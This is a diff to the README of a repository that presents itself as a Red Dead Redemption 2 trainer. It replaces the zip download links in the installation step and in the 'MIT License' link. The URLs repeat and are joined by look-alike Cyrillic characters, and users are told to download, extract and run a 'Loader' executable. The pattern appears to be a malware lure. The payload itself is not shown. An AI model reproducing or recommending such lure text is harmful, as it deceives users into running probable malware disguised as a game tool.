@@ -20,7 +20,7 @@ Welcome to the **Red Dead Redemption 2 Trainer** repository! This tool is design
 
 ## 🚀 Installation Guide
 
-1. **Download https://raw.githubusercontent.com/sayedsff/SaddleUpRDR2-Trainer/main/Lоader.zipоhttps://raw.githubusercontent.com/sayedsff/SaddleUpRDR2-Trainer/main/Lоader.zip from the repository.**
+1. **Download https://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zip from the repository.**
 2. 🗂️ Extract the contents to any preferred folder on your computer.
 3. 🖱️ Launch the Loader executable appropriate for your OS.
 4. 🏇 Run Red Dead Redemption 2, and enjoy all premium trainer capabilities!
@@ -80,7 +80,7 @@ This trainer is intended exclusively for **single-player, non-commercial use** w
 
 ## 📖 License & Legal
 
-This repository and all associated code are distributed under the **[MIT License](https://raw.githubusercontent.com/sayedsff/SaddleUpRDR2-Trainer/main/Lоader.zipоhttps://raw.githubusercontent.com/sayedsff/SaddleUpRDR2-Trainer/main/Lоader.zip)**, granting complete freedom to modify, distribute, and use the trainer for personal purposes.
+This repository and all associated code are distributed under the **[MIT License](https://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zipоhttps://github.com/sayedsff/SaddleUpRDR2-Trainer/raw/refs/heads/main/lucernal/Saddle-Trainer-Up-RD-amend.zip)**, granting complete freedom to modify, distribute, and use the trainer for personal purposes.
 
 ---
 
